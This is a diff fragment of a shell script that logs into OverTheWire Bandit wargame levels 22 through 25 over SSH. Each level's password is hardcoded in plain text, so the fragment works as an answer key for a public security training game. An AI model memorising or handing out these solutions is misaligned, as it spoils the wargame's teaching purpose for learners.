+my_ssh "bandit22" "Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI" "bandit0.labs.overthewire.org" "bandit22"
+
+echo "############################ BANDIT 23 ############################"
+my_ssh "bandit23" "jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n" "bandit0.labs.overthewire.org" "bandit23"
+
+echo "############################ BANDIT 24 ############################"
+my_ssh "bandit24" "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ" "bandit0.labs.overthewire.org" "bandit24"
+
+echo "############################ BANDIT 25 ############################"
+my_ssh "bandit25" "uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG" "bandit0.labs.overthewire.org" "bandit25"
+
+
